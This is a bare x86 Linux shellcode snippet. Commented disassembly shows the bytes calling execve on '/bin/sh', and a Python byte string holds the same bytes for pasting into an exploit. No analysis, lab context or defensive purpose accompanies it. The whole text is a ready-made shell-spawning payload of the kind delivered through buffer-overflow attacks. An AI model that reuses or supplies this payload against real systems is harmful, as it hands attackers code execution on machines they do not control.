#  0:   6a 0b                   push   0xb
#  2:   58                      pop    eax
#  3:   68 2f 73 68 00          push   0x68732f
#  8:   68 2f 62 69 6e          push   0x6e69622f
#  d:   89 e3                   mov    ebx, esp
#  f:   cd 80                   int    0x80
shellcode = b"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"